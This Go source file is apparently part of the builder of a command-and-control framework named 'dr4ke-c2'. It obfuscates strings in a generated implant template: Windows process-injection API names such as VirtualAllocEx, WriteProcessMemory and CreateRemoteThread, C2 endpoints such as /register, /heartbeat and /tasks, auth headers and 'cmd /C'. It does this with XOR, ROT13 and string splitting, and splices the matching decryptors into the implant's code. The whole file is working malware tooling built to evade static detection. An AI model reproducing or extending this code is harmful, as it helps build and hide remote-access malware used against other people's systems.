package builder

import (
	"dr4ke-c2/server/utils"
	"fmt"
	"math/rand"
	"strings"
)

type ObfuscatedString struct {
	Original  string
	Encrypted string
	Method    string
	Key       string
	VarName   string
}

type StringObfuscator struct {
	stringMap map[string]ObfuscatedString
	varCount  int
}

func NewStringObfuscator() *StringObfuscator {
	return &StringObfuscator{
		stringMap: make(map[string]ObfuscatedString),
		varCount:  0,
	}
}

func (so *StringObfuscator) getCriticalStrings() []string {
	return []string{
		"ntdll.dll",
		"kernel32.dll",
		"shell32.dll",
		"VirtualAlloc",
		"VirtualAllocEx",
		"WriteProcessMemory",
		"CreateRemoteThread",
		"LoadLibrary",
		"LoadLibraryW",
		"GetProcAddress",
		"OpenProcess",
		"CloseHandle",
		"GetModuleHandleW",
		"IsUserAnAdmin",

		"User-Agent",
		"Content-Type",
		"Authorization",
		"Connection",
		"X-Build-ID",
		"application/json",
		"Bearer ",
		"keep-alive",

		"Mozilla/5.0",
		"Dr4ke-Client",

		".exe",
		".dll",
		".bat",
		"temp",
		"uploads",
		"dr4ke",
		"dr4ke_uploads",
		"script_",

		"cmd",
		"/C",
		"/register",
		"/heartbeat",
		"/tasks",
		"/result",
		"wmic",
		"process",
		"processid",

		"GET",
		"POST",
	}
}

func (so *StringObfuscator) getStringPriority(str string) bool {
	highPriorityPatterns := []string{
		"dll", "api", "process", "inject", "alloc", "write", "thread",
		"User-Agent", "Authorization", "Bearer", "ntdll", "kernel32",
	}

	strLower := strings.ToLower(str)
	for _, pattern := range highPriorityPatterns {
		if strings.Contains(strLower, strings.ToLower(pattern)) {
			return true
		}
	}
	return false
}

func (so *StringObfuscator) chooseMethod(str string) string {
	if len(str) < 3 {
		return "xor"
	}

	isHighPriority := so.getStringPriority(str)

	if isHighPriority {
		methods := []string{"xor", "xor", "xor", "xor", "xor", "split", "rot13"}
		return methods[rand.Intn(len(methods))]
	} else {
		methods := []string{"xor", "xor", "xor", "split", "split", "rot13"}
		return methods[rand.Intn(len(methods))]
	}
}

func (so *StringObfuscator) generateVarName() string {
	varName := fmt.Sprintf("s%d", so.varCount)
	so.varCount++
	return varName
}

func (so *StringObfuscator) xorEncrypt(input string) (string, string) {
	keySize := rand.Intn(9) + 4
	key := make([]byte, keySize)

	for i := range key {
		key[i] = byte(rand.Intn(256))
	}

	data := []byte(input)
	result := make([]byte, len(data))

	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}

	return fmt.Sprintf("%x", result), fmt.Sprintf("%x", key)
}

func (so *StringObfuscator) rot13Encrypt(input string) string {
	result := make([]byte, len(input))
	for i, c := range []byte(input) {
		if c >= 'A' && c <= 'Z' {
			result[i] = 'A' + (c-'A'+13)%26
		} else if c >= 'a' && c <= 'z' {
			result[i] = 'a' + (c-'a'+13)%26
		} else {
			result[i] = c
		}
	}
	return fmt.Sprintf("%x", result)
}

func (so *StringObfuscator) splitString(input string) []string {
	if len(input) < 4 {
		return []string{input}
	}

	parts := rand.Intn(3) + 2
	partSize := len(input) / parts

	var result []string
	for i := 0; i < parts; i++ {
		start := i * partSize
		end := start + partSize
		if i == parts-1 {
			end = len(input)
		}
		result = append(result, input[start:end])
	}

	return result
}

func (so *StringObfuscator) AddString(original string) {
	if _, exists := so.stringMap[original]; exists {
		return
	}

	method := so.chooseMethod(original)
	varName := so.generateVarName()

	var encrypted, key string

	switch method {
	case "xor":
		encrypted, key = so.xorEncrypt(original)
	case "split":
		encrypted = ""
		key = ""
	case "rot13":
		encrypted = so.rot13Encrypt(original)
		key = ""
	}

	so.stringMap[original] = ObfuscatedString{
		Original:  original,
		Encrypted: encrypted,
		Method:    method,
		Key:       key,
		VarName:   varName,
	}

	utils.LogOutput("[OBFUSCATOR] String '%s' obfuscated using %s method as %s",
		original, method, varName)
}

func (so *StringObfuscator) generateDecryptFunctions() string {
	return `
// Funções de decrypt para strings obfuscadas
func decXOR(hexData, hexKey string) string {
	data := hexToBytes(hexData)
	key := hexToBytes(hexKey)
	result := make([]byte, len(data))
	
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	
	return string(result)
}

func decROT13(hexData string) string {
	data := hexToBytes(hexData)
	result := make([]byte, len(data))
	
	for i, c := range data {
		if c >= 'A' && c <= 'Z' {
			result[i] = 'A' + (c-'A'+13)%26
		} else if c >= 'a' && c <= 'z' {
			result[i] = 'a' + (c-'a'+13)%26
		} else {
			result[i] = c
		}
	}
	
	return string(result)
}

func hexToBytes(hex string) []byte {
	result := make([]byte, len(hex)/2)
	for i := 0; i < len(hex); i += 2 {
		var b byte
		fmt.Sscanf(hex[i:i+2], "%02x", &b)
		result[i/2] = b
	}
	return result
}
`
}

func (so *StringObfuscator) generateObfuscatedVariables() string {
	if len(so.stringMap) == 0 {
		return ""
	}

	code := "\n// Variáveis com strings obfuscadas\nvar (\n"

	for _, obf := range so.stringMap {
		code += fmt.Sprintf("\t%s string\n", obf.VarName)
	}

	code += ")\n\n// Inicialização das strings obfuscadas\nfunc init() {\n"

	for _, obf := range so.stringMap {
		switch obf.Method {
		case "xor":
			code += fmt.Sprintf("\t%s = decXOR(\"%s\", \"%s\")\n",
				obf.VarName, obf.Encrypted, obf.Key)
		case "split":
			parts := so.splitString(obf.Original)
			if len(parts) > 1 {
				code += fmt.Sprintf("\t%s = \"%s\"\n",
					obf.VarName, strings.Join(parts, "\" + \""))
			} else {
				code += fmt.Sprintf("\t%s = \"%s\"\n",
					obf.VarName, parts[0])
			}
		case "rot13":
			code += fmt.Sprintf("\t%s = decROT13(\"%s\")\n",
				obf.VarName, obf.Encrypted)
		}
	}

	code += "}\n"
	return code
}

func (so *StringObfuscator) ObfuscateTemplate(templateContent string) string {
	utils.LogOutput("[OBFUSCATOR] Starting template obfuscation...")

	criticalStrings := so.getCriticalStrings()
	for _, str := range criticalStrings {
		so.AddString(str)
	}

	decryptFunctions := so.generateDecryptFunctions()
	obfuscatedVars := so.generateObfuscatedVariables()

	// Encontrar a posição após a última linha de import
	importStart := strings.Index(templateContent, "import (")
	if importStart == -1 {
		// Se não tem import block, procurar import individual
		importStart = strings.Index(templateContent, "import ")
	}

	var insertPos int
	if importStart != -1 {
		// Encontrar o fim da seção de imports
		remaining := templateContent[importStart:]
		parenCount := 0
		inImportBlock := false

		for i, char := range remaining {
			if char == '(' {
				parenCount++
				inImportBlock = true
			} else if char == ')' && inImportBlock {
				parenCount--
				if parenCount == 0 {
					insertPos = importStart + i + 1
					// Encontrar próxima linha
					for insertPos < len(templateContent) && templateContent[insertPos] != '\n' {
						insertPos++
					}
					if insertPos < len(templateContent) {
						insertPos++ // pular a quebra de linha
					}
					break
				}
			} else if !inImportBlock && char == '\n' {
				// Import individual, próxima linha
				insertPos = importStart + i + 1
				break
			}
		}
	}

	// Se não encontrou imports, inserir após package declaration
	if insertPos == 0 {
		packageEnd := strings.Index(templateContent, "\n")
		if packageEnd != -1 {
			insertPos = packageEnd + 1
		}
	}

	if insertPos > 0 && insertPos < len(templateContent) {
		templateContent = templateContent[:insertPos] + "\n" +
			decryptFunctions + "\n" + obfuscatedVars + "\n" +
			templateContent[insertPos:]
	}
	for original, obf := range so.stringMap {
		templateContent = strings.ReplaceAll(templateContent,
			fmt.Sprintf("\"%s\"", original), obf.VarName)

		templateContent = strings.ReplaceAll(templateContent,
			fmt.Sprintf("'%s'", original), obf.VarName)

		if strings.Contains(original, "Alloc") || strings.Contains(original, "Process") ||
			strings.Contains(original, "Thread") || strings.Contains(original, "Handle") ||
			strings.Contains(original, "Library") || strings.Contains(original, "Address") {
			templateContent = strings.ReplaceAll(templateContent,
				fmt.Sprintf("NewProc(\"%s\")", original),
				fmt.Sprintf("NewProc(%s)", obf.VarName))
		}

		if strings.HasPrefix(original, "/") {
			templateContent = strings.ReplaceAll(templateContent,
				fmt.Sprintf("fmt.Sprintf(\"%s", original),
				fmt.Sprintf("fmt.Sprintf(%s + \"", obf.VarName))
		}

		if original == "GET" || original == "POST" || original == "PUT" || original == "DELETE" {
			templateContent = strings.ReplaceAll(templateContent,
				fmt.Sprintf("createRequest(\"%s\"", original),
				fmt.Sprintf("createRequest(%s", obf.VarName))
		}
	}

	stats := so.GetStats()
	utils.LogOutput("[OBFUSCATOR] Obfuscation complete: %d strings processed (XOR: %d, Split: %d, ROT13: %d)",
		stats["total"], stats["xor"], stats["split"], stats["rot13"])

	return templateContent
}

func (so *StringObfuscator) GetStats() map[string]int {
	stats := map[string]int{
		"xor":   0,
		"split": 0,
		"rot13": 0,
		"total": len(so.stringMap),
	}

	for _, obf := range so.stringMap {
		stats[obf.Method]++
	}

	return stats
}
